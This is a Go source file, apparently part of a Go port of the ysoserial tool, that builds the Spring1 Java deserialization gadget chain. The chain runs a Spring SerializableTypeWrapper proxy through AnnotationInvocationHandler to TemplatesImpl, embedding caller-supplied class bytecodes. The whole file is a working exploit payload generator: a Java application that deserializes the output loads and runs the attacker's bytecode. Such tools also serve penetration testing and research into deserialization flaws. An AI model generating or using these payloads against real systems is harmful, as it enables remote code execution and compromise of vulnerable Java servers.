package ysoserial

func Spring1(bytecodes []byte) []byte {
	return ClassObject{
		name:             "org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider",
		serialVersionUID: -7932601391990044854,
		classDescFlags:   SC_SERIALIZABLE,
		fields: []Field{
			{Integer, "index", 0},
			{"Ljava/lang/Class;", "declaringClass", ClassObject{
				name:              "java.lang.Object",
				serialVersionUID:  0,
				classDescFlags:    0x00,
				fields:            []Field{},
				objectAnnotations: interfaces(),
				super:             nil,
			}},
			{"Ljava/lang/String;", "methodName", "newTransformer"},
			{"Lorg/springframework/core/SerializableTypeWrapper$TypeProvider;", "provider", ClassObject{
				name:              "org.springframework.core.SerializableTypeWrapper$TypeProvider",
				serialVersionUID:  0,
				classDescFlags:    0x00,
				fields:            []Field{},
				objectAnnotations: interfaces(),
				super: &ClassObject{
					name:             "java.lang.reflect.Proxy",
					serialVersionUID: -2222568056686623797,
					classDescFlags:   SC_SERIALIZABLE,
					fields: []Field{
						{"Ljava/lang/reflect/InvocationHandler;", "h", ClassObject{
							name:             "sun.reflect.annotation.AnnotationInvocationHandler",
							serialVersionUID: 6182022883658399397,
							classDescFlags:   SC_SERIALIZABLE,
							fields: []Field{
								{"Ljava/util/Map;", "memberValues", ClassObject{
									name:             "java.util.HashMap",
									serialVersionUID: 362498820763181265,
									classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
									fields: []Field{
										{Float, "loadFactor", 0.75},
										{Integer, "threshold", 12},
									},
									objectAnnotations: interfaces(
										blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01},
										ClassDesc{
											name:             "java.lang.reflect.Type",
											serialVersionUID: 0,
											classDescFlags:   0x00,
										}, ClassDesc{
											name:             "javax.xml.transform.Templates",
											serialVersionUID: 0,
											classDescFlags:   0x00,
										}, ClassObject{
											name:             "org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler",
											serialVersionUID: -8835275493235412717,
											classDescFlags:   SC_SERIALIZABLE,
											fields: []Field{
												{"Lorg/springframework/beans/factory/ObjectFactory;", "objectFactory", ClassDesc{
													name:             "org.springframework.beans.factory.ObjectFactory",
													serialVersionUID: 0,
													classDescFlags:   0x00,
												}},
											},
											objectAnnotations: interfaces(),
											super:             nil,
										},
									),
									super: nil,
								}},
								{Object, "type", ClassObject{
									name:              "java.lang.Override",
									serialVersionUID:  0,
									classDescFlags:    0x00,
									fields:            []Field{},
									objectAnnotations: interfaces(),
									super:             nil,
								}},
							},
							objectAnnotations: interfaces(
								blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01},
								ClassObject{
									name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
									serialVersionUID: 673094361519270707,
									classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
									fields: []Field{
										{Integer, "_indentNumber", 0},
										{Integer, "_transletIndex", 0},
										{"[[B", "_bytecodes", ArrayObject{
											name:             "[[B",
											serialVersionUID: 5475560301672258359,
											classDescFlags:   SC_SERIALIZABLE,
											values: interfaces(
												ArrayObject{
													name:             "[B",
													serialVersionUID: -5984413125824719648,
													classDescFlags:   SC_SERIALIZABLE,
													values:           interfaces(bytecodes),
												}, ArrayObject{
													name:             "[B",
													serialVersionUID: -5984413125824719648,
													classDescFlags:   SC_SERIALIZABLE,
													values: interfaces(
														byte(0xca), byte(0xfe), byte(0xba), byte(0xbe), byte(0x00), byte(0x33), byte(0x00), byte(0x11), byte(0x01), byte(0x00), byte(0x23), byte(0x6f), byte(0x72), byte(0x67), byte(0x2f), byte(0x61), byte(0x70), byte(0x61), byte(0x63), byte(0x68), byte(0x65), byte(0x2f), byte(0x6c), byte(0x6f), byte(0x67), byte(0x34), byte(0x6a), byte(0x2f), byte(0x62), byte(0x63), byte(0x65), byte(0x6c), byte(0x2f), byte(0x67), byte(0x65), byte(0x6e), byte(0x65), byte(0x72), byte(0x69), byte(0x63), byte(0x2f), byte(0x49), byte(0x55), byte(0x53), byte(0x48), byte(0x52), byte(0x07), byte(0x00), byte(0x01), byte(0x00), byte(0x10), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x2f), byte(0x6c), byte(0x61), byte(0x6e), byte(0x67), byte(0x2f), byte(0x4f), byte(0x62), byte(0x6a), byte(0x65), byte(0x63), byte(0x74), byte(0x07), byte(0x00), byte(0x03), byte(0x01), byte(0x00), byte(0x0a), byte(0x53), byte(0x6f), byte(0x75), byte(0x72), byte(0x63), byte(0x65), byte(0x46), byte(0x69), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x0a), byte(0x49), byte(0x55), byte(0x53), byte(0x48), byte(0x52), byte(0x2e), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x01), byte(0x00), byte(0x10), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x56), byte(0x65), byte(0x72), byte(0x73), byte(0x69), byte(0x6f), byte(0x6e), byte(0x55), byte(0x49), byte(0x44), byte(0x01), byte(0x00), byte(0x01), byte(0x4a), byte(0x05), byte(0x71), byte(0xe6), byte(0x69), byte(0xee), byte(0x3c), byte(0x6d), byte(0x47), byte(0x18), byte(0x01), byte(0x00), byte(0x0d), byte(0x43), byte(0x6f), byte(0x6e), byte(0x73), byte(0x74), byte(0x61), byte(0x6e), byte(0x74), byte(0x56), byte(0x61), byte(0x6c), byte(0x75), byte(0x65), byte(0x01), byte(0x00), byte(0x06), byte(0x3c), byte(0x69), byte(0x6e), byte(0x69), byte(0x74), byte(0x3e), byte(0x01), byte(0x00), byte(0x03), byte(0x28), byte(0x29), byte(0x56), byte(0x0c), byte(0x00), byte(0x0c), byte(0x00), byte(0x0d), byte(0x0a), byte(0x00), byte(0x04), byte(0x00), byte(0x0e), byte(0x01), byte(0x00), byte(0x04), byte(0x43), byte(0x6f), byte(0x64), byte(0x65), byte(0x00), byte(0x21), byte(0x00), byte(0x02), byte(0x00), byte(0x04), byte(0x00), byte(0x01), byte(0x00), byte(0x1a), byte(0x00), byte(0x07), byte(0x00), byte(0x08), byte(0x00), byte(0x01), byte(0x00), byte(0x0b), byte(0x00), byte(0x02), byte(0x00), byte(0x09), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x0c), byte(0x00), byte(0x0d), byte(0x00), byte(0x01), byte(0x00), byte(0x10), byte(0x00), byte(0x11), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x05), byte(0x2a), byte(0xb7), byte(0x00), byte(0x0f), byte(0xb1), byte(0x00), byte(0x01), byte(0x00), byte(0x05), byte(0x00), byte(0x02), byte(0x00), byte(0x06),
													),
												},
											),
										},
										},
										{"[Ljava/lang/Class;", "_class", nil},
										{Object, "_namem", "ZMOCHAYT"},
										{"Ljava/util/Properties;", "_outputProperties", nil},
									},
									objectAnnotations: interfaces(),
									super:             nil,
								},
							),
							super: nil,
						}},
					},
					objectAnnotations: interfaces(),
					super:             nil,
				},
			}},
		},
		objectAnnotations: interfaces(),
		super:             nil,
	}.SerializeWithMagicHeader()
}
